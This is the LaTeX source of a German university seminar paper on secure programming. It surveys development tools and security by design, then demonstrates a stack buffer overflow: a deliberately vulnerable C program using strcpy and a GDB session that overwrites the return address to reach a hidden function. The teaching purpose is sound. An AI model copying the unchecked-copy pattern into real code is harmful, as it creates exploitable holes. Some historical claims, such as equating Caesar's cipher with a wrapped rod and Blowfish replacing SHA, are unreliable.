% allgem. Dokumentenformat
\documentclass[a4paper,12pt,headsepline]{scrartcl}

% weitere Pakete
% Grafiken aus PNG Dateien einbinden
\usepackage{graphicx}

% Normabstand bei Einheiten
\usepackage{siunitx}

% Deutsche Sonderzeichen benutzen 
\usepackage{ngerman}

% deutsche Silbentrennung
\usepackage[ngerman]{babel}

% Eurozeichen einbinden
\usepackage[right]{eurosym}

% Umlaute unter UTF8 nutzen
\usepackage[utf8]{inputenc}

% Zeichenencoding
\usepackage[T1]{fontenc}

\usepackage{lmodern}
\usepackage{fix-cm}

% floatende Bilder ermöglichen
%\usepackage{floatflt}

% mehrseitige Tabellen ermöglichen
\usepackage{longtable}

% Unterstützung für Schriftarten
%\newcommand{\changefont}[3]{ 
%\fontfamily{#1} \fontseries{#2} \fontshape{#3} \selectfont}

% Packet für Seitenrandabständex und Einstellung für Seitenränder
\usepackage{geometry}
\geometry{left=3.5cm, right=2cm, top=2.5cm, bottom=2cm}

% Paket für Boxen im Text
\usepackage{fancybox}

% bricht lange URLs "schoen" um
\usepackage[hyphens,obeyspaces,spaces]{url}

% Paket für Textfarben
\usepackage{color}

% Mathematische Symbole importieren
\usepackage{amssymb}

% auf jeder Seite eine Überschrift (alt, zentriert)
%\pagestyle{headings}

% erzeugt Inhaltsverzeichnis mit Querverweisen zu den Kapiteln (PDF Version)
\usepackage[bookmarksnumbered,pdftitle={Hausarbeit im Seminar 21817 „IT-Sicherheit“},hyperfootnotes=true]{hyperref} 
%\hypersetup{colorlinks, citecolor=red, linkcolor=blue, urlcolor=black}
\hypersetup{colorlinks, citecolor=black, linkcolor= black, urlcolor=black}

% neue Kopfzeilen mit fancypaket
\usepackage{fancyhdr} %Paket laden
\pagestyle{fancy} %eigener Seitenstil
\fancyhf{} %alle Kopf- und Fußzeilenfelder bereinigen
\fancyhead[L]{} %Kopfzeile links
\fancyhead[C]{} %zentrierte Kopfzeile
\fancyhead[R]{\thepage} %Kopfzeile rechts
\renewcommand{\headrulewidth}{0.4pt} %obere Trennlinie
%\fancyfoot[C]{\thepage} %Seitennummer
%\renewcommand{\footrulewidth}{0.4pt} %untere Trennlinie

% für Tabellen
\usepackage{array}

% Runde Klammern für Zitate
%\usepackage[numbers,round]{natbib}

% Festlegung Art der Zitierung - Havardmethode: Abkuerzung Autor + Jahr
\bibliographystyle{alphadin}

% Schaltet den zusätzlichen Zwischenraum ab, den LaTeX normalerweise nach einem Satzzeichen einfügt.
\frenchspacing

% Paket für Zeilenabstand
\usepackage{setspace}

% für Bildbezeichner
\usepackage{capt-of}

% für Stichwortverzeichnis
\usepackage{makeidx}

% für Listings
\usepackage{listings}
\lstset{numbers=left, numberstyle=\tiny, numbersep=5pt, keywordstyle=\color{black}\bfseries, stringstyle=\ttfamily,showstringspaces=false,basicstyle=\footnotesize,captionpos=b}
\lstset{language=perl}

% Indexerstellung
\makeindex

% Abkürzungsverzeichnis
\usepackage[german]{nomencl}
\let\abbrev\nomenclature

% Abkürzungsverzeichnis LiveTex Version
\renewcommand{\nomname}{Abkürzungsverzeichnis}
\setlength{\nomlabelwidth}{.25\hsize}
\renewcommand{\nomlabel}[1]{#1 \dotfill}
\setlength{\nomitemsep}{-\parsep}
\makenomenclature
%\makeglossary

% Abkürzungsverzeichnis TeTEX Version
\usepackage[german]{nomencl}
\makenomenclature
%\makeglossary
\renewcommand{\nomname}{Abkürzungsverzeichnis}
\setlength{\nomlabelwidth}{.25\hsize}
\renewcommand{\nomlabel}[1]{#1 \dotfill}
\setlength{\nomitemsep}{-\parsep}

% Disable single lines at the start of a paragraph (Schusterjungen)
\clubpenalty = 10000
% Disable single lines at the end of a paragraph (Hurenkinder)
\widowpenalty = 10000
\displaywidowpenalty = 10000

\begin{document}
% hier werden die Trennvorschläge inkludiert
\input{trennung}

%Schriftart Helvetica
%\changefont{phv}{m}{n}

% Leere Seite am Anfang
%~ \newpage
\thispagestyle{empty} % erzeugt Seite ohne Kopf- / Fusszeile
% Titelseite %
\thispagestyle{empty}

\begin{figure}[t]
 \centering
 \includegraphics[width=0.6\textwidth]{abbildungen/feulogo}
\end{figure}


\begin{verbatim}


\end{verbatim}

\begin{center}
\Large{FernUniversität }\\
\Large{in Hagen}\\
\end{center}


\begin{center}
\Large{Fakultät für Mathematik und Informatik}
\end{center}
\begin{verbatim}




\end{verbatim}
\begin{center}
\doublespacing
\textbf{\LARGE{Hausarbeit}}\\
\singlespacing
\begin{verbatim}

\end{verbatim}
\textbf{{im Seminar 21817 „IT-Sicherheit“}}
\end{center}
\begin{verbatim}

\end{verbatim}
\begin{center}

\end{center}
\begin{verbatim}

\end{verbatim}


%~ \begin{center}
%~ \textbf{Thema}\\
%~ \textbf{Aspekte der Sicherheit in der Programmierung}
%~ \end{center}


\begin{verbatim}






\end{verbatim}
\begin{flushleft}
\begin{tabular}{llll}
\textbf{Thema:} & & Aspekte der Sicherheit in der Programmierung & \\
& & \\
\textbf{Autor:} & & Florian Mahlecke <florian.mahlecke@cirosec.de>& \\
& & MatNr. 8632014 & \\
\textbf{Autor:} & & Kirsten Katharina Roschanski <studium@kirsten-roschanski.de>& \\
& & MatNr. 9053522 & \\
& & \\
\textbf{Version vom:} & & \today &\\
& & \\
\textbf{Betreuer:} & & Dipl. Inf. Daniel Berg &\\
\end{tabular}
\end{flushleft}


% römische Numerierung
%\pagenumbering{arabic}

% 1.5 facher Zeilenabstand
\onehalfspacing

% Sperrvermerk
%~ \input{sperrvermerk}

% einfacher Zeilenabstand
%\singlespacing

% Inhaltsverzeichnis anzeigen
\newpage
\tableofcontents

% das Abkürzungsverzeichnis
\newpage
% Abkürzungsverzeichnis soll im Inhaltsverzeichnis auftauchen
\addcontentsline{toc}{section}{Abkürzungsverzeichnis}
% das Abkürzungsverzeichnis entgültige Ausgeben
\fancyhead[L]{Abkürzungsverzeichnis} %Kopfzeile links
\input{abkuerzungen}
\printnomenclature

% Definiert Stegbreite bei zweispaltigem Layout
\setlength{\columnsep}{25pt}

%%%%%%%%%%%%%%%%% Kapitel 1 %%%%%%%%%%%%%%%%%% 
\newpage
\thispagestyle{fancy}
\fancyhead[L]{} %Kopfzeile links
% 1,5 facher Zeilenabstand
\onehalfspacing
% einzelne Kapitel
\section{Einleitung}\label{einleitung}

Jede Entwicklerin und jeder Entwickler möchte neben der Funktionalität 
auch die Sicherheit ihrer/seiner Software garantieren.

Um die Aspekte der sicheren Programmierung zu betrachten, 
muss man sich im Vorfeld über die grundlegenden Risiken bei der 
Entwicklung von Softwarelösungen informieren.
Im Kontext der Informationstechnik haben sich drei primäre Schwachpunkte
herauskristallisiert:

\begin{itemize}
      \item\textbf{Vertraulichkeit}\\
 	   Eine Softwarelösung führt eine ausreichende Überprüfung von 
 	   Benutzerberechtigungen durch und erlaubt nur legitimen Benutzern 
 	   den Zugriff auf (vertrauliche) Daten. 
 	   Die Vertraulichkeit von Daten hat implizit rechtliche Auswirkungen 
 	   und ist in vielen Ländern durch entsprechende nationale Gesetze 
 	   geregelt (z.B. Bundesdatenschutzgesetz). Neben rechtlichen 
 	   Auswirkungen hat die Vertraulichkeit von Daten im Hinblick auf 
 	   wirtschaftliche Interessen (z.B. Diebstahl von Forschungsergebnissen) 
 	   einen sehr hohen Stellenwert.
	  
	  \item\textbf{Integrität}\\
	   Eine Softwarelösung verhindert eine Manipulation von Daten oder 
	   stellt Methoden (z.B. Hashwertbildung) zur Feststellung einer 
	   unerlaubten Modifikation der Daten bereit.
	  
	  \item\textbf{Verfügbarkeit} \\
	   Eine Softwarelösung muss funktionieren, auch wenn ein Fehler 
	   oder Problemfall auftritt. Die Verfügbarkeit ist aus wirtschaftlicher 
	   Sicht analog zur Vertraulichkeit zu bewerten. Fällt in einem 
	   Unternehmen eine zentrale Systemkomponente (z.B. SAP-System) 
	   aufgrund eines Softwarefehlers aus, kann dies zum vollständigen 
	   erliegen eines Geschäftsprozesses führen und in kürzester Zeit 
	   einen immensen monetären Schaden verursachen.
\end{itemize}

Da zur Wahrung der oben aufgeführten Schutzziele im Umfeld der 
Softwareentwicklung vielfältige Lösungsansätze existieren, würde eine 
detaillierte Betrachtungen der verschiedenen Entwicklungsparadigmen, 
Implementierungsverfahren und Frameworks den Rahmen dieser Ausarbeitung 
bei Weitem überschreiten. Aus diesem Grund betrachten die Verfasser 
ausgewählte Entwicklungsprozesse und Konzepte, die eine sichere 
Entwicklung von Software unterstützen. Daneben werden verschiedene 
Angriffs- und Bedrohungsszenarien einschließlich möglicher 
Gegenmaßnahmen aufgezeigt.




%%%%%%%%%%%%%%%%% Kapitel 2 %%%%%%%%%%%%%%%%%% 
\newpage
\thispagestyle{fancy} 
\fancyhead[L]{\nouppercase{\leftmark}} %Kopfzeile links
% Kirsten
\section{Softwareentwicklung}

Die Softwareentwicklung selbst ist so alt wie das Computerzeitalter. 
Mit den ersten Computern wurden auch die ersten Programme entwickelt,
diese waren noch lange nicht so umfangreich wie die heutigen, so wurden
auch schon in den frühen Anfängen einfache mathematische Operationen durchgeführt. 

Mit der immer leistungsfähiger werdenden Hardware, werden Softwareentwicklungen
die einst als sicher galten heute als unsicher eingestuft. Alleine immer
bessere Hardware schafft mehr Opperationen in kürzerer Zeit zu berrechnen.
Was zu Folge hat, dass auch komplexe Algorithmen in immer kürzerer Zeit
gelöst werden. Was eigentlich als technischer Fortschritt und Verbesserung 
angesehen werden kann, führt aber auch zu neuen Problemen.
Um vertrauliche Informationen unleserlich zu machen, reichte es Cäsar 
ein Stück Papyrus um einen zylindrischen Holzstab zu wickeln und die 
Informationen so unleserlich zu machen.\footnote{http://de.wikipedia.org/wiki/Caesar-Verschlüsselung} 
Im zweiten Weltkrieg wurde dann die Enigma \footnote{http://de.wikipedia.org/wiki/Enigma_(Maschine)} 
lange Zeit eingesetzt um eine sichere Kommunikation zu gewährleisten. 
Erst in den 1970er Jahren gab es einen Wechsel von symmetrische auf 
asymmetrische Verschlüsselung, wobei Sender und Empfänger nicht mehr auf 
den gleichen Schlüssel angewiesen waren. Seid dem wird der als sicher
geltende Schlüssel gefühlt jährlich verdoppelt. Zudem gesellen sich immer
neuere Verschlüsselungsalgorithmen, die auf mathematischen Grundlagen basieren. 
So wird die 1993 entwickelte Blowfish-Verschlüsselung\footnote{http://www.schneier.com/blowfish.html}
heute bevorzugt verwendet und ersetzt damit den SHA-Algorythmus\footnote{http://csrc.nist.gov/publications/fips/fips180-2/fips180-2withchangenotice.pdf}. 
In PHP5.5 wurde Blowfish als erste Passwortverschlüsselung in die neue
Hash-Funktion aufgenommen.  

Es findet ein ständigen Wettkampf mit immer besser werdenden
Hardware und komplexeren Softwareanwendungen statt. So kann konnte man 
2000 noch ein Programm nach den damaligen "Sicherheitsrichtlininen" 
entwickeln, welches heute als risikobehaftet gilt. So entstehen 
neue Herausforderungen die es zu meistern gilt. 
Softwareentwicklungen müssen oft in einem zeitlich vorgeschriebenen 
Rahmen fertiggestellt werden. Daher wird oft geschaut welche Lebensdauer 
die Software hat und für welchen Einsatzzweck sie bestimmt ist. Bei einigen
Projekten wird dann ein Risikomanagement durchgeführt, das den 
Schaden schon vor der eigentlichen Entwicklung abschätzen soll.

\subsection{Programmiersprachen}
Im einundzwanzigsten Jahrhundert bewegt man sich in einem multikulturellen 
Umfeld, in mehrerlei Hinsicht.

So gab es schon in den Anfängen des Computerzeitalters gleich dutzende 
von Programmiersprachen, die aber jeweils speziell an die Bedürfnisse der 
Anforderung angepasst waren. Mit Basic und C entstanden die ersten universellen
Programmiersprachen die die Entwicklung rasch voran trieben und heute 
noch eingesetzt werden.

Dann kam in den 1990er-Jahren das Internet, welches neue Anforderungen
an die Programmiersprachen stellte und durch die rasche Entwicklung auch 
viele Programmiersprachen sterben ließ, da sie mit dem Fortschritt 
nicht mithalten konnten.

Das war die Geburtsstunde der objektorientierten und skriptbasierten 
Programmiersprachen.

Durch die Globalisierung und damit schnellere Kommunikationswege und 
einer einheitlichen Sprache (englisch), kann man sich auch über große 
Distanzen austauschen und Wissen teilen.

Das heute verbreitetste Programmierparadigma ist das Objektorientierte.
Dabei wird versucht, die Daten als Objekt zu betrachten und so die 
Komplexität zu vereinfachen, indem Redundanzen nutzbar gemacht werden.
Auch heute gibt es noch zahlreiche Programmiersprachen, die ihre Anhänger
haben, die sich in sogennante Communitys zusammenschließen um die 
Programmiersprachen weiter zu entwickeln und das Wissen auszutauschen.

\subsection{Frameworks} 
Ein Framework stellt kein fertiges Programm dar, vielmehr dient es 
Entwicklerinnen und Entwicklern als Grundgerüst in der 
objektorientierten Programmierung. Es bringt dabei für gewöhnlich neben 
der Struktur auch die Anwendungsarchitektur mit. Insbesondere wird 
aber der Kontrollfluss der Anwendung und die Schnittstellen darüber
in architektonischen Mustern bereitgestellt. 
Heute gibt es zahlreiche Frameworks zu fast jeder Programmiersprachen und
Anwendungsfall, daher gibt es keine allgemeingültige Definition.   

\minisec{Framework Typen}
\begin{itemize}
  \item Application Frameworks 
        \newline bilden das Programmiergerüst für Anwendungen.
  \item Domain Frameworks 
        \newline bilden das Programmiergerüst für Problembereich.
  \item Class Frameworks 
        \newline bilden über Klassen und Methoden die Abstraktionsebenen 
        für ein breites Anwendungsfeld ab.
  \item Komponenten-Frameworks
        \newline bilden die Basis für Software-Komponenten, indem sie die 
        objektorientierte Ebenen abstrahieren.
  \item Coordination-Frameworks
        \newline bilden die Basis für Geräte-Interaktion.
  \item Tests Frameworks
        \newline dienen als Programmiergerüst für (automatisierte) Softwaretests.
  \item Webframeworks
        \newline sind speziell für Webanwendungen ausgelegt.
\end{itemize}

\subsection{Entwicklungsumgebungen}
Eine Entwicklungsumgebungen oder kurz IDE (Integrierte Entwicklungsumgebung)
ist eine Sammlung verschiedener Anwendungsprogramme. Somit kann man 
Medienbrüche in der Softwareentwicklung vermeiden. Was gerade bei größeren
Entwicklungen zu Effizienz in der Arbeit führt.
Es gibt für fast jede Programmiersprache eine große Vielzahl von 
Entwicklungsumgebungen. Sowohl Open-Source als auch proprietäre 
Entwicklungsumgebungen.
So ist die wohl bekannteste und verbreitetste Entwicklungsumgebung für
Softwareentwicklungen die in und ursprünglich für Java geschriebene 
Umgebung Eclipse\footnote{http://www.eclipse.org/}. Die Entwicklungsumgebung
erfreute sich nicht zuletzt durch den 2001 von IBM freigebenden Quellcode
großer Beliebtheit. Auch die Weiterentwicklung ist zur Zeit gesichert, 
da IBM weiterhin Entwickler für die Arbeit an der Software finanziert. 
Durch Erweiterungen erden weitere Programmiersprachen
von Eclipse unterstützt. Dadurch ist jeder der mit Softwareentwicklung
zu tun hat schon mal mit Eclipse in Berührung gekommen.  
Dieses ist aber lange nicht die einzige Erfolgsgeschichte auf dem Markt
der Entwicklungsumgebungen. So gibt es zahlreiche Produkte, die um die 
Gunst der Softwareentwickler buhlen. 

\subsection{Versionskontrollsystem}
Bei einem Versionskontrollsystem werden Änderungen dokumentiert und
festgehalten. So lassen sich Veränderungen an einem Dokument auch
über viele folgende Änderungen nachschlagen und rückgängig machen bzw.
nachverfolgen warum eine Änderung vorgenommen wurde.
Es gibt verschiedene Funktionsweisen:
\begin{itemize}
  \item Lokale Versionsverwaltung
  \item Zentrale Versionsverwaltung 
  \item Verteilte Versionsverwaltung 
\end{itemize}
Die wohl bekanntesten Vertreter solcher Software sind Subversion (SVN)
\footnote{http://subversion.apache.org} und git\footnote{http://git-scm.com}, die
zudem noch unter freien Lizenzen stehen.
Dabei zählt SVN zu den zentralen Versionsverwaltung und git zur 
verteilten Versionsverwaltung.
SVN ist wohl die bekannteste Versionsverwaltung und mit Version 1.1 schafft
sie bereits 2004 den Durchbruch, als Änderungen nicht mehr in der Datenbank, 
sondern im Dateisystem abgelegt werden konnten.
git ist erst 2005 durch Linus Torvalds entwickelt worden, nachdem die
Lizenz für das bisher von ihm eingesetzte Versionskontrollsystem geändert 
wurde. Der große Durchbruch gelang aber erst durch github, einer Plattform
auf der man seine Projekte teilen und mit anderen bearbeiten kann.

\subsection{Ticketsystem}
In einem Ticketsystem werden Fehler oder aber neue Funktionswünsche 
durch Mitglieder/Kunden/... gemeldet, die dann von einem Entwickler 
oder einer Entwicklerin betrachtet, nachvollzogen und klassifiziert
werden können. 
Voraussetzung für eine Fehlerbehebung ist eine genaue Fehlerbeschreibung 
und ein reproduzierbarer Weg um den Fehler zu erzeugen/hervorzurufen.
Durch verschiedene Statuse kann dann dem Nutzer mitgeteilt werden wann 
oder in welcher Version der Fehler behoben ist.
In Open-Souce-Projekten sind solche Ticketsystem zudem offen, so das 
andere die Problemstellung einsehen können und ggf. einen besseren
oder anderen Lösungsansatz vorab diskutieren können.

\subsection{Softwarearten}
Mit Softwarearten ist in diesem Kapitel die Art der Entstehung/Entwicklung
der Software gemeint.
Weithin gibt es zwei Arten der Softwarentwicklung:
\begin{itemize}
  \item kommerzielle Softwareentwicklung
  \item freie Softwareentwicklung
\end{itemize}
Mit "frei" ist in diesem Fall Software gemeint, wo der Quellcode der
Software frei von jedem Nutzer eingesehen werden kann. Sehr häufig wird
"frei" mit open-source gleichgesetzt, was aber defakto nicht der Fall ist.
\minisec{kommerzielle Softwareentwicklung} 
Bei kommerzieller Softwareentwicklung handelt es sich häufig um 
Auftragsprojekte durch einen Kunden bzw. Eigenentwicklungen um ein
Softwareprodukt auf dem Markt zu platzieren.
Bei kommerziellen Softwareentwicklungen kennt oft nur ein erlesener Kreis
an Personen den Quellcode und ist auch für dessen Qualität verantwortlich.
Zwar wird hier versucht, hochwertige Arbeit abzuliefern, doch leider
ist das nicht immer der Fall. Teilweise wird der Code an externe
Firmen zur Sicherheitsprüfung rausgegeben, da die Gewinnoptimierung 
stets eine große Rolle spielt, wird leider aber genauso oft auf solche Tests
verzichtet und darauf vertraut, das die eigenen Entwickler/Entwicklerinnen
den Code geprüft haben und an alle Sicherheitsmerkmale gedacht haben.
\minisec{freie Softwareentwicklung}   
Bei quellcodefreier Software kann jeder vorher selber prüfen, wenn er dazu
selbst in der Lage ist, oder jemanden beauftragen die Software zu prüfen.
In Open-Source Communitys passiert dieses häufig automatisch. Da hier 
mehrere Entwickler/Entwicklerinnen an einem Projekt arbeiten wird ein
Versionskontrollsystem eingesetzt. Hier kann jede Veränderung nachverfolgt 
werden. Durch die Verknüpfung mit einem Ticketsystem sind Nutzer in der 
Lage, Wünsche und Fehler zu melden, die dann behoben oder
aufgenommen werden können. Anschließend schauen mehrere unabhängige 
Entwickler/Entwicklerinnen über den neu hinzugefügten Code und geben
ihr Urteil darüber ab. 
Durch diese Art der Entwicklung findet gleichzeitig eine Prüfung der
Qualität und Sicherheit der Software statt.  


\subsection{Softwareentwicklung durch \textit{Security by Design}}
Der Frauenhofer Verlag hat auch in diesem Jahr eine aktualisierte 
Ausgabe seines Trend- und Strategiebericht zu "Entwicklung sicherer 
Software durch Security by Design"
\footnote{https://www.sit.fraunhofer.de/fileadmin/dokumente/studien_und_technical_reports/Trendbericht_Security_by_Design.pdf} 
herausgegeben.
Dabei geht es darum, bei der Softwarenetwicklung bestimmte
Sicherheitsaspekte wie Lebenszyklus und die Integration von 
Softwarekomponenten anderer Hersteller frühzeitig zu analysieren.
Dieser Trend- und Strategiebericht soll nicht als Richtlinie verstanden
werden, eher soll er als Leitfaden dienen um sich mit der Problemstellung
zu befassen.
Das 65 Seitige Werk geht dabei auf die Bedeutung von Security By Design ein
und zeigt wie durch Automatisierung und Reduktion menschlicher Fehlereinflüsse
Code sicherer gemacht werden kann. Weiterhin bietet es einen Einblick
in Probleme die Legacy-Software mit sich bringt und zeigt an verteilter 
Entwicklung und Interagtion das kaum noch ein Softwareprojekt von einem
einzigen Entwicklerteam realisiert wird und wo hier die Gefahren liegen.
Den Abschluss macht ein Blick in die Zukunft, wo es darum geht, das
schon heute einen Schritt in die richtige Richtung gegangen ist, 
aber noch einen weiten Weg bevorsteht bis es keine Meldungen
über Sicherheitslücken und Angriffe mehr gibt.


%%%%%%%%%%%%%%%%% Kapitel 3 %%%%%%%%%%%%%%%%%% 
\newpage
\thispagestyle{fancy} 
\fancyhead[L]{\nouppercase{\leftmark}} %Kopfzeile links
%Florian
\section{Schwachstellen}\label{schwachstellen}
Im folgenden Kapitel werden die am häufigsten anzutreffenden Schwachstellen bei der Software Entwicklung vorgestellt. 

\subsection{Binäre Anwendungen}	

\subsubsection{Buffer-Overflow Schwachstellen}	

Buffer-Overflows Schwachstellen entstehen im Regelfall durch die Verwendung von Programmiersprachen, die es einem Entwickler ermöglichen, allozierte Speicherbereiche unkontrolliert zu überschreiben.
\par\medskip 
Als ein typischer Vertreter für eine Programmiersprache die potentiell für Buffer-Schwachstellen anfällig ist, gilt die Programmiersprache C. Die Programmiersprache ermöglicht es einem Entwickler, nahezu beliebige Speicheradressen zu überschreiben und bietet darüber hinaus noch zahlreiche eigene, native C-Funktionen (z.B. \texttt{strcpy()}), die unabhängig vom Entwickler keinerlei Prüfungen in Hinsicht auf den benötigten Speicherplatz implementiert haben.
\\\\
\textbf{Beispiel: Stack-Overflow (Setup: x64-System, Linux, gcc-4.8.1)}
\\
Der C-Code im folgenden Beispiel erwartet die Eingabe einer beliebigen Zeichenkette mit einer maximalen Länge von 64 Zeichen als Kommandozeilenparameter. Die im Code verwendete C-Funktion \texttt{strcpy()} gilt als unsicher, da keine Längenprüfung des zu kopierenden Strings vorgenommen wird. Mithilfe der \texttt{strcpy()}-Funktion ist es später möglich, die Rücksprungadresse der \texttt{go()}-Funktion so zu modifizieren, dass die im Code nicht aufgerufene Funktion \texttt{pwnd()} ausgeführt wird.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int go(char *input) {
        char data[64];
        strcpy(data,input);
        printf ("String: %s\n", data);
        return 1;
}

void pwnd(void) {
        printf("\nPWND!\n");
        exit(0);
}

int main(int argc, char *argv[]) {
        if (argc > 1)
        go(argv[1]);
}
\end{lstlisting}

\begin{figure}[htbp]
 \centering
 \includegraphics[scale=.5]{abbildungen/poc_1}
 \caption{Reguläre Funktionsweise des Programms}
 \label{fig:poc_1} 
\end{figure}

Im Folgenden wird das Programm analysiert und versucht, durch eine erfolgreiche Modifikation der Speicheradressen die Funktion \texttt{pwnd()} aufzurufen.
Um das Programm zu analysieren wird der GNU Debugger\footnote{http://www.gnu.org/software/gdb} (GDB-Kurzreferenz\footnote{http://beej.us/guide/bggdb}) verwendet. Für einen ersten Überblick werden die drei Funktionen disassembliert.
\\
\\
\texttt{main()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[florian@audit exploit]$ gdb -q poc
Reading symbols from /home/florian/exploit/poc...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400624 <+0>:     push   %rbp
   [...]
   0x000000000040063d <+25>:    add    $0x8,%rax
   0x0000000000400641 <+29>:    mov    (%rax),%rax
   0x0000000000400644 <+32>:    mov    %rax,%rdi
   0x0000000000400647 <+35>:    callq  0x4005d0 <go>
   0x000000000040064c <+40>:    leaveq
   0x000000000040064d <+41>:    retq
End of assembler dump.
\end{lstlisting}
\texttt{go()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas go
Dump of assembler code for function go:
   [...]
   0x00000000004005e0 <+16>:    lea    -0x40(%rbp),%rax
   0x00000000004005e4 <+20>:    mov    %rdx,%rsi
   0x00000000004005e7 <+23>:    mov    %rax,%rdi
   0x00000000004005ea <+26>:    callq  0x400480 <strcpy@plt>
   0x00000000004005ef <+31>:    lea    -0x40(%rbp),%rax
   0x00000000004005f3 <+35>:    mov    %rax,%rsi
   0x00000000004005f6 <+38>:    mov    $0x4006d4,%edi
   0x00000000004005fb <+43>:    mov    $0x0,%eax
   0x0000000000400600 <+48>:    callq  0x4004a0 <printf@plt>
   0x0000000000400605 <+53>:    mov    $0x1,%eax
   0x000000000040060a <+58>:    leaveq
   0x000000000040060b <+59>:    retq
End of assembler dump.
\end{lstlisting}
\texttt{pwnd()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas pwnd
Dump of assembler code for function pwnd:
   0x000000000040060c <+0>:     push   %rbp
   [...]
\end{lstlisting}
\par\medskip 
Aus den disassemblierten Funktionen können folgende Informationen entnommen werden:
\\
\textbf{\texttt{main()}-Funktion}

\begin{itemize}
      \item \texttt{0x0000000000400647 <+35>:    callq  0x4005d0 <go>}\\
        An dieser Stelle wird durch einen \texttt{call} die Funktion \texttt{go()} aufgerufen.
      \item \texttt{0x000000000040064c <+40>:    leaveq}\\
        Wurde die \texttt{go()}-Funktion erfolgreich durchlaufen, wird aus der \texttt{go()}-Funktion an diese Speicheradresse in die \texttt{main()}-Funktion zurückgesprungen.       
\end{itemize}
\textbf{\texttt{go()}-Funktion}

\begin{itemize}
      \item \texttt{x00000000004005ef <+31>:    lea    -0x40	(\%rbp), \%rax}\\
        Aufgrund des vorhandenen C-Code ist bereits bekannt, dass für die \texttt{strcpy()}-Funktion ein \SI{64}{Byte} großes Charakter-Array (\texttt{char data[64]}) als Ziel des Kopiervorgangs reserviert wurde. Läge der C-Code nicht vor, könnte man durch den hexadezimalen Wert \texttt{0x40} die maximale Speichergröße von \SI{64}{Byte} feststellen.        
      \item \texttt{0x000000000040060b <+59>:    retq}\\
        Nach der Ausführung dieser Instruktion muss der Befehlszeiger (IP, bei x64 RIP abgekürzt) auf die Speicheradresse \texttt{0x40064c} innerhalb der \texttt{main()}-Funktion zeigen.
\end{itemize}



\textbf{\texttt{pwnd()}-Funktion}

\begin{itemize}
      \item \texttt{0x000000000040060c <+0>:     push   \%rbp}\\
        Um die \texttt{pwnd()}-Funktion aus der \texttt{pwnd()}-Funktion heraus aufrufen zu können, muss der Befehlszeiger (RIP) innerhalb der \texttt{go()}-Funktion auf die Speicheradresse \texttt{0x40060c} geändert werden. 
\end{itemize}

Im Folgenden wird das Programm mit dem GDB gestartet, davor wird noch ein Haltepunkte an der Speicheradresse \texttt{0x40060b} gesetzt (siehe letzte Zeile der disassemblierten \texttt{go()} -Funktion) um die Überlegungen verifizieren zu können.
        
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
gdb) break *0x40060b
Breakpoint 6 at 0x40060b: file poc.c, line 13.
(gdb) run AAAAAAAA

String: AAAAAAAA

Breakpoint 6, 0x000000000040060b in go (input=0x7fffffffecdb "AAAAAAAA") at poc.c:13
13      }
(gdb) p &data
$20 = (char (*)[64]) 0x7fffffffe950
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb)
\end{lstlisting}

Das Programm wird mit 8-mal "A" als Konsolenparameter gestartet. Ist der Haltepunkte erreicht, wird der \SI{64}{Byte} große Speicherbereich der Variablen \texttt{data} gesucht. Im Anschluss werden vom Beginn des Speicherbereichs der Variablen \texttt{data} 12-mal \SI{8}{Byte} große Speicherbereiche dargestellt. 

Die ersten \SI{8}{Byte} entsprechen der hexadezimalen Darstellung der Zeichenfolge \texttt{AAAAAAAA}, die als Übergabeparameter verwendet wurde. Die folgenden 7-mal \SI{8}{Byte} großen Speicherblöcke werden nicht verwendet und beinhalten ausschließlich zufällige Werte. Um die Rücksprungadresse erfolgreich zu modifizieren, sind die folgenden \SI{8}{Byte} bzw. \SI{16}{Byte} relevant:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
\end{lstlisting}

Der linke Teil entspricht dem Basepointer (RBP), der rechte Teil entspricht der Rücksprungadresse in die \texttt{main()}-Funktion. Wird diese Adresse mit der Speicheradresse der \texttt{pwnd()}-Funktion überschrieben, so springt das Programm zur Laufzeit in die \texttt{pwnd()}-Funktion und führt diese aus.
 
Mit den folgenden Befehlen wird die \texttt{go()}-Funktion disassembliert, um die Startwert der \texttt{go()}-Funktion festzustellen. Im Anschluss werden die 12-mal \SI{8}{Byte} großen Speicheradressen ausgegeben und zwei Byte der Rücksprungadresse \texttt{0x40064c} modifiziert. Danach wird das Programm weiter ausgeführt und wie springt in die \texttt{pwnd()}-Funktion.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas pwnd
Dump of assembler code for function pwnd:
   0x000000000040060c <+0>:     push   %rbp
   [...]	

End of assembler dump.
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb) set {char}0x7fffffffe998 = 0x0c
(gdb) set {char}0x7fffffffe999 = 0x06
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040060c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb) c
Continuing.
PWND!
[Inferior 1 (process 1190) exited normally]
(gdb)
\end{lstlisting}

